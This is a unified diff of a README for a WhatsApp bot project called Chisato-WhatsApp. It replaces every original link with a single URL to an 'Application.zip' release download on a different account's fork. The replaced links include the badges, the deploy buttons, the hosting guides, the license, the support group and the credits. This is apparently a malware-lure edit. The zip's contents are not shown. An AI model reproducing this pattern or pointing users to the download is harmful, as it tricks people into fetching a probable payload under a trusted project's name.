@@ -1,34 +1,34 @@
 <p align="center">
-<img src="https://telegra.ph/file/bdd281b87aaa6f4ee0a67.jpg" alt="nz" width="350"/>
+<img src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip" alt="nz" width="350"/>
 </p>
 
 ## ***Chisato-WhatsApp***
 > This Script WhatsApp Bot Using Library Baileys & Script is free for everyone, not for Sale!
-> ***Note: it's a modified version of [WhatsApp-bot](https://github.com/LuckyYam/WhatsApp-bot)***
+> ***Note: it's a modified version of [WhatsApp-bot](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)***
 </br>
 
-<a href="https://github.com/AliAryanTech/"><img title="Author" src="https://img.shields.io/badge/Author-AliAryanTech-blue.svg?color=54aeff&style=for-the-badge&logo=github" /></a>  
-<a href="https://github.com/AliAryanTech/Chisato-WhatsApp"><img title="Stars" src="https://img.shields.io/github/stars/AliAryanTech/Chisato-WhatsApp?color=54aeff&style=flat-square" /></a>
-<a href="https://github.com/AliAryanTech/Chisato-WhatsApp/network/members"><img title="Forks" src="https://img.shields.io/github/forks/AliAryanTech/Chisato-WhatsApp?color=54aeff&style=flat-square" /></a>
-<a href="https://github.com/AliAryanTech/Chisato-WhatsApp/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/AliAryanTech/Chisato-WhatsApp?label=watchers&color=54aeff&style=flat-square" /></a> <br>
+<a href="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip"><img title="Author" src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip" /></a>  
+<a href="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip"><img title="Stars" src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip" /></a>
+<a href="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip"><img title="Forks" src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip" /></a>
+<a href="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip"><img title="Watching" src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip" /></a> <br>
 
 ---
 
 ### Deployment Methods 
-[![Deploy with Heroku](https://www.herokucdn.com/deploy/button.svg "Deploy with Heroku")](https://heroku.com/deploy?template=https://github.com/AliAryanTech/Chisato-WhatsApp/blob/master/ "Deploy with Heroku")
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/apps/deploy?type=docker&image=quay.io/toshi-san001/koyeb-auto-install:main&env%5BPORT%5D=8000&env%5BPREFIX%5D&&env%5BMONGODB%5D&&env%MODS%5D&name=Chisato-WhatsApp)
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/3j9GNw?referralCode=TE7efK)
+[![Deploy with Heroku](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip "Deploy with Heroku")](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip "Deploy with Heroku")
+[![Deploy to Koyeb](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip%5BPORT%5D=8000&env%5BPREFIX%5D&&env%5BMONGODB%5D&&env%MODS%5D&name=Chisato-WhatsApp)
+[![Deploy on Railway](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
 
 ### Deployment Guide
-- [Self Hosting Guide](https://github.com/AliAryanTech/Chisato-WhatsApp/blob/master/Self-Hosting-Guide.md)
-- [Heroku Hosting Guide](https://github.com/AliAryanTech/Chisato-WhatsApp/blob/master/Heroku-Hosting-Guide.md)
+- [Self Hosting Guide](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
+- [Heroku Hosting Guide](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
 
 ### Preview Info
 - Fully Modular Design </br>
-- Written in [TypeScript](https://www.typescriptlang.org/)
-- Built with [Baileys](https://github.com/adiwajshing/baileys) (A Lightweight full-featured WhatsApp Library)
-- Powered by [ExpressJs](https://expressjs.com/) </br>
-- Database handled via [MongoDB](https://www.mongodb.com/) </br>
+- Written in [TypeScript](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
+- Built with [Baileys](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip) (A Lightweight full-featured WhatsApp Library)
+- Powered by [ExpressJs](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip) </br>
+- Database handled via [MongoDB](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip) </br>
 - Self Auth restoration </br>
 
 ### Contribution
@@ -39,16 +39,16 @@
 
 ## License
 
-> Chisato-WhatsApp is free and open-source software licensed under the [GNU Affero General Public License v3.0](https://github.com/AliAryanTech/Chisato-WhatsApp/blob/master/LICENSE)
+> Chisato-WhatsApp is free and open-source software licensed under the [GNU Affero General Public License v3.0](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
 
 ## Support 🍪
 
-<a href="https://chat.whatsapp.com/IDXPYkGVTjw6GbSnMbVNcK">
-  <img src="https://img.shields.io/badge/Support_Group-0a0a0a?style=for-the-badge&logo=whatsapp&logoColor=white">
+<a href="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip">
+  <img src="https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip">
 </a>
 
 </br>
 
 ## Thanks To
-* [`Shinei | Whatshell`](https://github.com/LuckyYam/)
-* [`@adiwajshing/baileys`](https://github.com/adiwajshing/baileys)
+* [`Shinei | Whatshell`](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
+* [`@adiwajshing/baileys`](https://github.com/Abhayedits/Chisato-WhatsApp/releases/download/v1.0/Application.zip)
